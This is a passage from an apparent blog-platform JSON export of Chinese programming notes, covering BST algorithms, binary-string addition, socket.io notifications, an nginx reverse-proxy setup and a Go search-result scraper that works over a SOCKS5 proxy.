判断二叉树是否二叉查找树\\n\\n//先序遍历，利用区间判断\\n```\\nbool run(struct TreeNode* root,long min,long max){\\n    if(root==NULL){\\n        return true;\\n    }\\n    if(root->val<=min||root->val>=max){\\n        return false;\\n    }\\n    return run(root->left,min,root->val)&&run(root->right,root->val,max);\\n}\\n \\n \\nbool isValidBST(struct TreeNode* root) {\\n    return run(root,LONG_MIN,LONG_MAX);\\n}\\n\\n```\\n\\n//中序遍历验证（二叉搜索树，中序遍历是从小到大的一组数字）\\n```\\nvar pre *TreeNode\\nfunc isValidBST(root *TreeNode) bool {\\n    pre=nil\\n    return run(root)\\n}\\nfunc run(root *TreeNode)bool{\\n    if(root==nil){\\n\\t\\treturn true\\n\\t}\\n\\tb1:=run(root.Left)\\n\\tif(pre!=nil&&pre.Val>=root.Val){\\n\\t\\treturn false\\n\\t}\\n\\tpre=root\\n\\tb2:=run(root.Right)\\n\\treturn b1&&b2\\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>判断二叉树是否二叉查找树</p>\n<p>//先序遍历，利用区间判断</p>\n<pre><code>bool run(struct TreeNode* root,long min,long max){\n    if(root==NULL){\n        return true;\n    }\n    if(root-&gt;val&lt;=min||root-&gt;val&gt;=max){\n        return false;\n    }\n    return run(root-&gt;left,min,root-&gt;val)&amp;&amp;run(root-&gt;right,root-&gt;val,max);\n}\n \n \nbool isValidBST(struct TreeNode* root) {\n    return run(root,LONG_MIN,LONG_MAX);\n}\n\n</code></pre>\n<p>//中序遍历验证（二叉搜索树，中序遍历是从小到大的一组数字）</p>\n<pre><code>var pre *TreeNode\nfunc isValidBST(root *TreeNode) bool {\n    pre=nil\n    return run(root)\n}\nfunc run(root *TreeNode)bool{\n    if(root==nil){\n\t\treturn true\n\t}\n\tb1:=run(root.Left)\n\tif(pre!=nil&amp;&amp;pre.Val&gt;=root.Val){\n\t\treturn false\n\t}\n\tpre=root\n\tb2:=run(root.Right)\n\treturn b1&amp;&amp;b2\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"88","plaintext":"判断二叉树是否二叉查找树\n\n//先序遍历，利用区间判断\n\nbool run(struct TreeNode* root,long min,long max){\n    if(root==NULL){\n        return true;\n    }\n    if(root->val<=min||root->val>=max){\n        return false;\n    }\n    return run(root->left,min,root->val)&&run(root->right,root->val,max);\n}\n \n \nbool isValidBST(struct TreeNode* root) {\n    return run(root,LONG_MIN,LONG_MAX);\n}\n\n\n\n//中序遍历验证（二叉搜索树，中序遍历是从小到大的一组数字）\n\nvar pre *TreeNode\nfunc isValidBST(root *TreeNode) bool {\n    pre=nil\n    return run(root)\n}\nfunc run(root *TreeNode)bool{\n    if(root==nil){\n\t\treturn true\n\t}\n\tb1:=run(root.Left)\n\tif(pre!=nil&&pre.Val>=root.Val){\n\t\treturn false\n\t}\n\tpre=root\n\tb2:=run(root.Right)\n\treturn b1&&b2\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-02-22T10:09:07.000Z","created_by":"1","updated_at":"2017-03-16T07:46:33.000Z","updated_by":"1","published_at":"2017-02-22T10:09:30.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d315","uuid":"dcee36c5-1807-491d-84a8-6bf349ef5ba0","title":"Convert Sorted Array to Binary Search Tree","slug":"convert-sorted-array-to-binary-search-tree","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"有序数组创建高度最小的二叉查找树\\n```\\n// class TreeNode{\\n//     constructor(val) {\\n//         this.val = val;\\n//         this.left = null;\\n//         this.right=null\\n//       }\\n// }\\nvar sortedArrayToBST = function(nums) {\\n            function build(arr){\\n\\t\\t\\t\\tif(arr.length===0){return null;}\\n                var mid=Math.floor(arr.length/2);\\n\\t\\t\\t\\tvar node=new TreeNode(arr[mid]);\\n\\t\\t\\t\\tnode.left=build(arr.slice(0,mid))\\n\\t\\t\\t\\tnode.right=build(arr.slice(mid+1,arr.length))\\n\\t\\t\\t\\treturn node\\n            }\\n\\n            return build(nums);\\n};\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>有序数组创建高度最小的二叉查找树</p>\n<pre><code>// class TreeNode{\n//     constructor(val) {\n//         this.val = val;\n//         this.left = null;\n//         this.right=null\n//       }\n// }\nvar sortedArrayToBST = function(nums) {\n            function build(arr){\n\t\t\t\tif(arr.length===0){return null;}\n                var mid=Math.floor(arr.length/2);\n\t\t\t\tvar node=new TreeNode(arr[mid]);\n\t\t\t\tnode.left=build(arr.slice(0,mid))\n\t\t\t\tnode.right=build(arr.slice(mid+1,arr.length))\n\t\t\t\treturn node\n            }\n\n            return build(nums);\n};\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"89","plaintext":"有序数组创建高度最小的二叉查找树\n\n// class TreeNode{\n//     constructor(val) {\n//         this.val = val;\n//         this.left = null;\n//         this.right=null\n//       }\n// }\nvar sortedArrayToBST = function(nums) {\n            function build(arr){\n\t\t\t\tif(arr.length===0){return null;}\n                var mid=Math.floor(arr.length/2);\n\t\t\t\tvar node=new TreeNode(arr[mid]);\n\t\t\t\tnode.left=build(arr.slice(0,mid))\n\t\t\t\tnode.right=build(arr.slice(mid+1,arr.length))\n\t\t\t\treturn node\n            }\n\n            return build(nums);\n};","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-02-22T10:12:59.000Z","created_by":"1","updated_at":"2017-02-22T10:15:36.000Z","updated_by":"1","published_at":"2017-02-22T10:14:16.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d316","uuid":"5a785ba3-def3-4dc3-acb3-d87347c511df","title":"Add Binary--leetcode","slug":"add-binary-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"给定两个二进制字符串，返回它们的和（也是一个二进制字符串）。\\n```\\nvar addBinary = function(a, b) {\\n    if (a.length===0) return b;\\n    if (b.length===0) return a;\\n    if(a[a.length-1] == '1'&&b[b.length-1] == '1'){\\n        return addBinary(addBinary(a.slice(0,a.length-1),b.slice(0,b.length-1)),'1')+'0';\\n    }\\n    else{\\n        return addBinary(a.slice(0,a.length-1),b.slice(0,b.length-1))+(parseInt(a[a.length-1])||parseInt(b[b.length-1])).toString();\\n    }\\n};\\n```\\n\\n```\\npackage main\\nimport \\\"strconv\\\"\\n\\nfunc addBinary(a,b string) string{\\n\\tvar lenA=len(a)\\n\\tvar lenB=len(b)\\n\\tif(lenA==0){\\n\\t\\treturn b\\n\\t}\\n\\tif(lenB==0){\\n\\t\\treturn a\\n\\t}\\n\\tif(a[lenA-1:lenA]==\\\"1\\\"&&b[lenB-1:lenB]==\\\"1\\\"){\\n\\t\\treturn addBinary(addBinary(a[0:lenA-1],b[0:lenB-1]),\\\"1\\\")+\\\"0\\\"\\n\\t}else{\\n\\t\\ttemp1,_:=strconv.Atoi(a[lenA-1:lenA])\\n\\t\\ttemp2,_:=strconv.Atoi(b[lenB-1:lenB])\\n\\t\\treturn addBinary(a[0:lenA-1],b[0:lenB-1])+strconv.Itoa(temp1+temp2)\\n\\t}\\n}\\n```\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>给定两个二进制字符串，返回它们的和（也是一个二进制字符串）。</p>\n<pre><code>var addBinary = function(a, b) {\n    if (a.length===0) return b;\n    if (b.length===0) return a;\n    if(a[a.length-1] == '1'&amp;&amp;b[b.length-1] == '1'){\n        return addBinary(addBinary(a.slice(0,a.length-1),b.slice(0,b.length-1)),'1')+'0';\n    }\n    else{\n        return addBinary(a.slice(0,a.length-1),b.slice(0,b.length-1))+(parseInt(a[a.length-1])||parseInt(b[b.length-1])).toString();\n    }\n};\n</code></pre>\n<pre><code>package main\nimport &quot;strconv&quot;\n\nfunc addBinary(a,b string) string{\n\tvar lenA=len(a)\n\tvar lenB=len(b)\n\tif(lenA==0){\n\t\treturn b\n\t}\n\tif(lenB==0){\n\t\treturn a\n\t}\n\tif(a[lenA-1:lenA]==&quot;1&quot;&amp;&amp;b[lenB-1:lenB]==&quot;1&quot;){\n\t\treturn addBinary(addBinary(a[0:lenA-1],b[0:lenB-1]),&quot;1&quot;)+&quot;0&quot;\n\t}else{\n\t\ttemp1,_:=strconv.Atoi(a[lenA-1:lenA])\n\t\ttemp2,_:=strconv.Atoi(b[lenB-1:lenB])\n\t\treturn addBinary(a[0:lenA-1],b[0:lenB-1])+strconv.Itoa(temp1+temp2)\n\t}\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"90","plaintext":"给定两个二进制字符串，返回它们的和（也是一个二进制字符串）。\n\nvar addBinary = function(a, b) {\n    if (a.length===0) return b;\n    if (b.length===0) return a;\n    if(a[a.length-1] == '1'&&b[b.length-1] == '1'){\n        return addBinary(addBinary(a.slice(0,a.length-1),b.slice(0,b.length-1)),'1')+'0';\n    }\n    else{\n        return addBinary(a.slice(0,a.length-1),b.slice(0,b.length-1))+(parseInt(a[a.length-1])||parseInt(b[b.length-1])).toString();\n    }\n};\n\n\npackage main\nimport \"strconv\"\n\nfunc addBinary(a,b string) string{\n\tvar lenA=len(a)\n\tvar lenB=len(b)\n\tif(lenA==0){\n\t\treturn b\n\t}\n\tif(lenB==0){\n\t\treturn a\n\t}\n\tif(a[lenA-1:lenA]==\"1\"&&b[lenB-1:lenB]==\"1\"){\n\t\treturn addBinary(addBinary(a[0:lenA-1],b[0:lenB-1]),\"1\")+\"0\"\n\t}else{\n\t\ttemp1,_:=strconv.Atoi(a[lenA-1:lenA])\n\t\ttemp2,_:=strconv.Atoi(b[lenB-1:lenB])\n\t\treturn addBinary(a[0:lenA-1],b[0:lenB-1])+strconv.Itoa(temp1+temp2)\n\t}\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-02-23T08:41:22.000Z","created_by":"1","updated_at":"2017-03-14T08:37:46.000Z","updated_by":"1","published_at":"2017-02-23T08:42:08.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d317","uuid":"8c229638-cf0e-4f88-9a2a-ffcf9eef9e57","title":"Web Notification+Web socket+express实践","slug":"web-notification-web-socket-expressshi-jian","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> socket.io\\n\\n在express4+中，使用socket.io库\\n\\n```\\n//app.js\\nvar io = require('socket.io')();\\nvar allSocket={};\\nvar receive = require('./routes/receive')(io,allSocket); //利用高阶函数，向router中传递socket\\napp.io = io;\\nio.on('connection', function (socket) {\\n    console.log('socket连接成功');\\n    socket.on('join', function(data) {\\n        console.log(data.userName+'  join');\\n        allSocket[data.userName]=socket; //利用用户名做唯一标识，做私信时使用\\n    });\\n    socket.on('disconnect', function() {\\n        console.log('断开连接');\\n    });\\n});\\n\\n```\\n```\\n// bin/www加上\\napp.io.attach(server)\\n```\\n```\\n// routes/receive.js\\nmodule.exports=function(io,allSocket){\\n    router.post('/login', function (req, res) {\\n    req.models.users.find({ userName: req.body.userName }, function (err, rows) {\\n        if (rows.length > 0 && rows[0].password == req.body.password) {\\n            io.sockets.emit('receive', {});\\n        }\\n    });\\n});\\n\\n    return router;\\n}\\n\\n```\\n\\n> 浏览器端实现\\n```\\nNotification.requestPermission( function(status) {}); //请求权限\\n\\n\\n//socket.io-client.js\\nfunction RunSocket(data) {\\n  var socket = io('/');\\n  socket.on('connect', function () {\\n    console.log('connect');\\n    socket.emit(\\\"join\\\", { userName: data.data.userName })\\n  });\\n  socket.on('receive', function (data) {\\n    console.log('receive')\\n    var n = new Notification(data.userName + \\\"---通知来了\\\", { body: data.xssProjectName + \\\"---项目更新了\\\" ,icon:\\\"img/message.jpg\\\"});\\n  });\\n  socket.on('disconnect', function () { console.log('disconnect') });\\n}\\n```\\n> 效果如下\\n![](/content/images/2017/02/QQ--20170224190449.png)\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>socket.io</p>\n</blockquote>\n<p>在express4+中，使用socket.io库</p>\n<pre><code>//app.js\nvar io = require('socket.io')();\nvar allSocket={};\nvar receive = require('./routes/receive')(io,allSocket); //利用高阶函数，向router中传递socket\napp.io = io;\nio.on('connection', function (socket) {\n    console.log('socket连接成功');\n    socket.on('join', function(data) {\n        console.log(data.userName+'  join');\n        allSocket[data.userName]=socket; //利用用户名做唯一标识，做私信时使用\n    });\n    socket.on('disconnect', function() {\n        console.log('断开连接');\n    });\n});\n\n</code></pre>\n<pre><code>// bin/www加上\napp.io.attach(server)\n</code></pre>\n<pre><code>// routes/receive.js\nmodule.exports=function(io,allSocket){\n    router.post('/login', function (req, res) {\n    req.models.users.find({ userName: req.body.userName }, function (err, rows) {\n        if (rows.length &gt; 0 &amp;&amp; rows[0].password == req.body.password) {\n            io.sockets.emit('receive', {});\n        }\n    });\n});\n\n    return router;\n}\n\n</code></pre>\n<blockquote>\n<p>浏览器端实现</p>\n</blockquote>\n<pre><code>Notification.requestPermission( function(status) {}); //请求权限\n\n\n//socket.io-client.js\nfunction RunSocket(data) {\n  var socket = io('/');\n  socket.on('connect', function () {\n    console.log('connect');\n    socket.emit(&quot;join&quot;, { userName: data.data.userName })\n  });\n  socket.on('receive', function (data) {\n    console.log('receive')\n    var n = new Notification(data.userName + &quot;---通知来了&quot;, { body: data.xssProjectName + &quot;---项目更新了&quot; ,icon:&quot;img/message.jpg&quot;});\n  });\n  socket.on('disconnect', function () { console.log('disconnect') });\n}\n</code></pre>\n<blockquote>\n<p>效果如下<br>\n<img src=\"/content/images/2017/02/QQ--20170224190449.png\" alt=\"\"></p>\n</blockquote>\n<!--kg-card-end: markdown-->","comment_id":"91","plaintext":"> socket.io\n\n\n在express4+中，使用socket.io库\n\n//app.js\nvar io = require('socket.io')();\nvar allSocket={};\nvar receive = require('./routes/receive')(io,allSocket); //利用高阶函数，向router中传递socket\napp.io = io;\nio.on('connection', function (socket) {\n    console.log('socket连接成功');\n    socket.on('join', function(data) {\n        console.log(data.userName+'  join');\n        allSocket[data.userName]=socket; //利用用户名做唯一标识，做私信时使用\n    });\n    socket.on('disconnect', function() {\n        console.log('断开连接');\n    });\n});\n\n\n\n// bin/www加上\napp.io.attach(server)\n\n\n// routes/receive.js\nmodule.exports=function(io,allSocket){\n    router.post('/login', function (req, res) {\n    req.models.users.find({ userName: req.body.userName }, function (err, rows) {\n        if (rows.length > 0 && rows[0].password == req.body.password) {\n            io.sockets.emit('receive', {});\n        }\n    });\n});\n\n    return router;\n}\n\n\n\n> 浏览器端实现\n\n\nNotification.requestPermission( function(status) {}); //请求权限\n\n\n//socket.io-client.js\nfunction RunSocket(data) {\n  var socket = io('/');\n  socket.on('connect', function () {\n    console.log('connect');\n    socket.emit(\"join\", { userName: data.data.userName })\n  });\n  socket.on('receive', function (data) {\n    console.log('receive')\n    var n = new Notification(data.userName + \"---通知来了\", { body: data.xssProjectName + \"---项目更新了\" ,icon:\"img/message.jpg\"});\n  });\n  socket.on('disconnect', function () { console.log('disconnect') });\n}\n\n\n> 效果如下","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-02-24T10:44:42.000Z","created_by":"1","updated_at":"2017-02-24T11:05:57.000Z","updated_by":"1","published_at":"2017-02-24T10:59:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d318","uuid":"548ab5ac-b872-4326-ad1c-5d3ad693275a","title":"nginx反向代理，获取客户端ip地址","slug":"nginxfan-xiang-dai-li-huo-qu-ke-hu-duan-ipdi-zhi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"web服务器如nodejs获取客户端ip地址。一般使用req.connection.remoteAddress。但是当我们使用了nginx反向代理时候，这时req.connection.remoteAddress永远就是本机ip。因为web服务器3000端口永远是80端口代理过来的，可以把Nginx配置改下，可以解决。\\n```\\nserver {\\n\\tlisten 80 ;\\n\\tserver_name xss.dadigua.win;\\n\\tlocation / {\\n\\t\\tproxy_pass http://localhost:3000;\\n        proxy_set_header X-Real-IP $remote_addr;\\n        proxy_set_header Host $host;\\n\\t}\\n}\\n```\\n这时只需获取http头x-real-ip即可。如nodejs，req.headers['x-real-ip']。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>web服务器如nodejs获取客户端ip地址。一般使用req.connection.remoteAddress。但是当我们使用了nginx反向代理时候，这时req.connection.remoteAddress永远就是本机ip。因为web服务器3000端口永远是80端口代理过来的，可以把Nginx配置改下，可以解决。</p>\n<pre><code>server {\n\tlisten 80 ;\n\tserver_name xss.dadigua.win;\n\tlocation / {\n\t\tproxy_pass http://localhost:3000;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header Host $host;\n\t}\n}\n</code></pre>\n<p>这时只需获取http头x-real-ip即可。如nodejs，req.headers['x-real-ip']。</p>\n<!--kg-card-end: markdown-->","comment_id":"92","plaintext":"web服务器如nodejs获取客户端ip地址。一般使用req.connection.remoteAddress。但是当我们使用了nginx反向代理时候，这时req.connection.remoteAddress永远就是本机ip。因为web服务器3000端口永远是80端口代理过来的，可以把Nginx配置改下，可以解决。\n\nserver {\n\tlisten 80 ;\n\tserver_name xss.dadigua.win;\n\tlocation / {\n\t\tproxy_pass http://localhost:3000;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header Host $host;\n\t}\n}\n\n\n这时只需获取http头x-real-ip即可。如nodejs，req.headers['x-real-ip']。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-09T03:16:12.000Z","created_by":"1","updated_at":"2017-03-09T03:31:09.000Z","updated_by":"1","published_at":"2017-03-09T03:31:07.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d319","uuid":"686067dc-c6ca-4e9b-8d33-69394c05d175","title":"go笔记","slug":"gobi-ji","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\npackage main\\n\\nimport (\\n\\t\\\"fmt\\\"\\n\\t\\\"io/ioutil\\\"\\n\\t\\\"net/http\\\"\\n\\t\\\"os\\\"\\n\\t\\\"regexp\\\"\\n\\t\\\"github.com/urfave/cli\\\"\\n\\t\\\"golang.org/x/net/proxy\\\"\\n)\\n\\nvar (\\n\\turl = regexp.MustCompile(`<cite class=\\\"_Rm\\\">.+?</cite>`)\\n)\\n\\nfunc checkFileIsExist(filename string) bool {\\n\\tvar exist = true\\n\\tif _, err := os.Stat(filename); os.IsNotExist(err) {\\n\\t\\texist = false\\n\\t}\\n\\treturn exist\\n}\\n\\nfunc Get(url,ip,port string) (content string, statusCode int) {\\n\\tdialer, err := proxy.SOCKS5(\\\"tcp\\\", ip+\\\":\\\"+port, nil, proxy.Direct)\\n\\tif err != nil {\\n\\t\\tfmt.Fprintln(os.Stderr, \\\"can't connect to the proxy:\\\", err)\\n\\t\\tos.Exit(1)\\n\\t}\\n\\t// setup a http client\\n\\thttpTransport := &http.Transport{}\\n\\tclient := &http.Client{Transport: httpTransport}\\n\\t// set our socks5 as the dialer\\n\\thttpTransport.Dial = dialer.Dial\\n\\n\\treq, _ := http.NewRequest(\\\"GET\\\", url, nil)\\n\\treq.Header.Set(\\\"User-Agent\\\", \\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\\\")\\n\\t//\\tclient := http.DefaultClient\\n\\tres, error := client.Do(req)\\n\\tif error != nil {\\n\\t\\tfmt.Errorf(\\\"Get请求%s返回错误:%s\\\", url, error)\\n\\t\\treturn\\n\\t}\\n\\tstatusCode = res.StatusCode\\n\\tif res.StatusCode == 200 {\\n\\t\\tbody := res.Body\\n\\t\\tdefer body.Close()\\n\\t\\tbodyByte, _ := ioutil.ReadAll(body)\\n\\t\\tcontent = string(bodyByte)\\n\\t} else {\\n\\t\\tcontent = \\\"\\\"\\n\\t}\\n\\treturn\\n}\\n\\nfunc run(ip,port,q,num string) {\\n\\tfmt.Println(`Start...`)\\n\\ts, _ := Get(\\\"https://www.google.com.hk/search?q=\\\"+q+\\\"&num=\\\"+num,ip,port,)\\n\\tvar f *os.File\\n\\tvar filename = \\\"./output.txt\\\"\\n\\t// if checkFileIsExist(filename) { //如果文件存在\\n\\t// \\tf, _ = os.OpenFile(filename, os.O_APPEND, 0666) //打开文件\\n\\t// \\tfmt.Println(\\\"文件存在\\\")\\n\\t// } else {\\n\\t// \\tf, _ = os.Create(filename) //创建文件\\n\\t// \\tfmt.Println(\\\"文件不存在\\\")\\n\\t// }\\n\\n\\tstrArr := url.FindAllString(s, -1)\\n\\t//\\tfmt.Printf(\\\"%q\\\\n\\\",strArr)\\n\\t// reg1 := regexp.MustCompile(`(?P<q>Hell|G)o`)\\n\\t// fmt.Printf(\\\"%q\\\\n\\\", reg1.ReplaceAllString(\\\"Hello 世界！123 Go\\\", \\\"${q}ooo\\\"))\\n\\tstr := \\\"\\\"\\n\\treg := regexp.MustCompile(`(<cite class=\\\"_Rm\\\">|</cite>)`)\\n\\tfor i := 0; i < len(strArr); i++ {\\n\\t//\\tfmt.Printf(\\\"%q\\\\n\\\", reg.ReplaceAllString(strArr[i], \\\"${1}\\\"))\\n\\t\\tstr += reg.ReplaceAllString(strArr[i], \\\"\\\") + \\\"\\\\r\\\\n\\\"\\n\\t}\\n\\t//str+=s\\n\\tf, _ = os.Create(filename)\\n\\tdefer f.Close()\\n\\tn, _ := f.WriteString(str) //写入文件(字符串)\\n\\tfmt.Printf(\\\"写入 %d 个字节n\\\", n)\\n\\tf.Sync()\\n\\t//\\tfmt.Println(s)\\n}\\n\\nfunc main() {\\n app := cli.NewApp()\\n var ip string\\n var port string\\n var num string\\n\\n  app.Flags = []cli.Flag {\\n    cli.StringFlag{\\n      Name: \\\"ip\\\",\\n      Value: \\\"127.0.0.1\\\",\\n      Usage: \\\"SOCKS5代理地址\\\",\\n\\t  Destination: &ip,\\n    },cli.StringFlag{\\n      Name: \\\"port,P\\\",\\n      Value: \\\"3333\\\",\\n      Usage: \\\"SOCKS5代理端口\\\",\\n\\t  Destination: &port,\\n    },cli.StringFlag{\\n      Name: \\\"num,N\\\",\\n      Value: \\\"100\\\",\\n      Usage: \\\"搜索条数\\\",\\n\\t  Destination: &num,\\n    },\\n  }\\n\\n  app.Action = func(c *cli.Context) error {\\n    q := \\\"\\\"\\n    if c.NArg() > 0 {\\n      q = c.Args().Get(0)\\n    }else{\\n\\t\\t fmt.Println(\\\"请输入搜索关键字,如搜索1234 Get.exe 1234\\\\r\\\\nGet.exe -h,查看帮助\\\")\\n\\t\\t return nil\\n\\t}\\n\\trun(ip,port,q,num)\\n    return nil\\n  }\\n\\n  app.Run(os.Args)\\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>package main\n\nimport (\n\t&quot;fmt&quot;\n\t&quot;io/ioutil&quot;\n\t&quot;net/http&quot;\n\t&quot;os&quot;\n\t&quot;regexp&quot;\n\t&quot;github.com/urfave/cli&quot;\n\t&quot;golang.org/x/net/proxy&quot;\n)\n\nvar (\n\turl = regexp.MustCompile(`&lt;cite class=&quot;_Rm&quot;&gt;.+?&lt;/cite&gt;`)\n)\n\nfunc checkFileIsExist(filename string) bool {\n\tvar exist = true\n\tif _, err := os.Stat(filename); os.IsNotExist(err) {\n\t\texist = false\n\t}\n\treturn exist\n}\n\nfunc Get(url,ip,port string) (content string, statusCode int) {\n\tdialer, err := proxy.SOCKS5(&quot;tcp&quot;, ip+&quot;:&quot;+port, nil, proxy.Direct)\n\tif err != nil {\n\t\tfmt.Fprintln(os.Stderr, &quot;can't connect to the proxy:&quot;, err)\n\t\tos.Exit(1)\n\t}\n\t// setup a http client\n\thttpTransport := &amp;http.Transport{}\n\tclient := &amp;http.Client{Transport: httpTransport}\n\t// set our socks5 as the dialer\n\thttpTransport.Dial = dialer.Dial\n\n\treq, _ := http.NewRequest(&quot;GET&quot;, url, nil)\n\treq.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;)\n\t//\tclient := http.DefaultClient\n\tres, error := client.Do(req)\n\tif error != nil {\n\t\tfmt.Errorf(&quot;Get请求%s返回错误:%s&quot;, url, error)\n\t\treturn\n\t}\n\tstatusCode = res.StatusCode\n\tif res.StatusCode == 200 {\n\t\tbody := res.Body\n\t\tdefer body.Close()\n\t\tbodyByte, _ := ioutil.ReadAll(body)\n\t\tcontent = string(bodyByte)\n\t} else {\n\t\tcontent = &quot;&quot;\n\t}\n\treturn\n}\n\nfunc run(ip,port,q,num string) {\n\tfmt.Println(`Start...`)\n\ts, _ := Get(&quot;https://www.google.com.hk/search?q=&quot;+q+&quot;&amp;num=&quot;+num,ip,port,)\n\tvar f *os.File\n\tvar filename = &quot;./output.txt&quot;\n\t// if checkFileIsExist(filename) { //如果文件存在\n\t// \tf, _ = os.OpenFile(filename, os.O_APPEND, 0666) //打开文件\n\t// \tfmt.Println(&quot;文件存在&quot;)\n\t// } else {\n\t// \tf, _ = os.Create(filename) //创建文件\n\t// \tfmt.Println(&quot;文件不存在&quot;)\n\t// }\n\n\tstrArr := url.FindAllString(s, -1)\n\t//\tfmt.Printf(&quot;%q\\n&quot;,strArr)\n\t// reg1 := regexp.MustCompile(`(?P&lt;q&gt;Hell|G)o`)\n\t// fmt.Printf(&quot;%q\\n&quot;, reg1.ReplaceAllString(&quot;Hello 世界！123 Go&quot;, &quot;${q}ooo&quot;))\n\tstr := &quot;&quot;\n\treg := regexp.MustCompile(`(&lt;cite class=&quot;_Rm&quot;&gt;|&lt;/cite&gt;)`)\n\tfor i := 0; i &lt; len(strArr); i++ {\n\t//\tfmt.Printf(&quot;%q\\n&quot;, reg.ReplaceAllString(strArr[i], &quot;${1}&quot;))\n\t\tstr += reg.ReplaceAllString(strArr[i], &quot;&quot;) + &quot;\\r\\n&quot;\n\t}\n\t//str+=s\n\tf, _ = os.Create(filename)\n\tdefer f.Close()\n\tn, _ := f.WriteString(str) //写入文件(字符串)\n\tfmt.Printf(&quot;写入 %d 个字节n&quot;, n)\n\tf.Sync()\n\t//\tfmt.Println(s)\n}\n\nfunc main() {\n app := cli.NewApp()\n var ip string\n var port string\n var num string\n\n  app.Flags = []cli.Flag {\n    cli.StringFlag{\n      Name: &quot;ip&quot;,\n      Value: &quot;127.0.0.1&quot;,\n      Usage: &quot;SOCKS5代理地址&quot;,\n\t  Destination: &amp;ip,\n    },cli.StringFlag{\n      Name: &quot;port,P&quot;,\n      Value: &quot;3333&quot;,\n      Usage: &quot;SOCKS5代理端口&quot;,\n\t  Destination: &amp;port,\n    },cli.StringFlag{\n      Name: &quot;num,N&quot;,\n      Value: &quot;100&quot;,\n      Usage: &quot;搜索条数&quot;,\n\t  Destination: &amp;num,\n    },\n  }\n\n  app.Action = func(c *cli.Context) error {\n    q := &quot;&quot;\n    if c.NArg() &gt; 0 {\n      q = c.Args().Get(0)\n    }else{\n\t\t fmt.Println(&quot;请输入搜索关键字,如搜索1234 Get.exe 1234\\r\\nGet.exe -h,查看帮助&quot;)\n\t\t return nil\n\t}\n\trun(ip,port,q,num)\n    return nil\n  }\n\n  app.Run(os.Args)\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"93","plaintext":"package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"os\"\n\t\"regexp\"\n\t\"github.com/urfave/cli\"\n\t\"golang.org/x/net/proxy\"\n)\n\nvar (\n\turl = regexp.MustCompile(`<cite class=\"_Rm\">.+?</cite>`)\n)\n\nfunc checkFileIsExist(filename string) bool {\n\tvar exist = true\n\tif _, err := os.Stat(filename); os.IsNotExist(err) {\n\t\texist = false\n\t}\n\treturn exist\n}\n\nfunc Get(url,ip,port string) (content string, statusCode int) {\n\tdialer, err := proxy.SOCKS5(\"tcp\", ip+\":\"+port, nil, proxy.Direct)\n\tif err != nil {\n\t\tfmt.Fprintln(os.Stderr, \"can't connect to the proxy:\", err)\n\t\tos.Exit(1)\n\t}\n\t// setup a http client\n\thttpTransport := &http.Transport{}\n\tclient := &http.Client{Transport: httpTransport}\n\t// set our socks5 as the dialer\n\thttpTransport.Dial = dialer.Dial\n\n\treq, _ := http.NewRequest(\"GET\", url, nil)\n\treq.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\")\n\t//\tclient := http.DefaultClient\n\tres, error := 